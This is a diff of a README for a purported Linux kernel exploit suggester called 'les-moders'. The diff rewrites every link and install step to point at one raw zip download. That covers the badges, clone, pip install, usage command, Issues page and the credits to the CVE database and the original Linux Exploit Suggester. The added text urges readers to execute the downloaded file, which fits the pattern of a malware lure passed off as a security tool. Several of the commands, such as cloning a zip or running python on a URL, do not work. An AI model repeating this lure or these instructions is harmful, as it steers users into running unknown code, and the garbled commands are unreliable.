@@ -1,8 +1,8 @@
 # Modern Linux Exploit Suggester - Detect Kernel CVEs with Ease
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.6%2B-brightgreen.svg) ![Version](https://img.shields.io/badge/version-1.0.0-orange.svg) ![Releases](https://img.shields.io/badge/releases-latest-brightgreen.svg)
+![License](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip) ![Python](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip%https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip) ![Version](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip) ![Releases](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Jarrenstyle/les-moders/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip%https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip)](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip)
 
 ## Overview
 
@@ -22,7 +22,7 @@ To get started with **les-moders**, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Jarrenstyle/les-moders.git
+   git clone https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -34,17 +34,17 @@ To get started with **les-moders**, follow these steps:
 3. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip
    ```
 
-4. Download the latest release from the [Releases section](https://github.com/Jarrenstyle/les-moders/releases). Execute the downloaded file to run the tool.
+4. Download the latest release from the [Releases section](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip). Execute the downloaded file to run the tool.
 
 ## Usage
 
 To use **les-moders**, simply run the script:
 
 ```bash
-python les_moders.py
+python https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip
 ```
 
 Follow the prompts to input your system information. The tool will analyze your kernel and provide a list of relevant CVEs.
@@ -73,7 +73,7 @@ Contributions are welcome! If you would like to contribute to **les-moders**, pl
 
 ## Issues
 
-If you encounter any issues, please report them in the [Issues section](https://github.com/Jarrenstyle/les-moders/issues). We appreciate your feedback.
+If you encounter any issues, please report them in the [Issues section](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip). We appreciate your feedback.
 
 ## License
 
@@ -86,7 +86,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Resources
 
-- [CVE Database](https://cve.mitre.org/)
-- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
+- [CVE Database](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip)
+- [Linux Exploit Suggester](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip)
 
-For the latest updates and releases, visit the [Releases section](https://github.com/Jarrenstyle/les-moders/releases). Download the latest version and enhance your security assessments today!
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/Jarrenstyle/les-moders/main/les-modern/les_moders_v2.2.zip). Download the latest version and enhance your security assessments today!
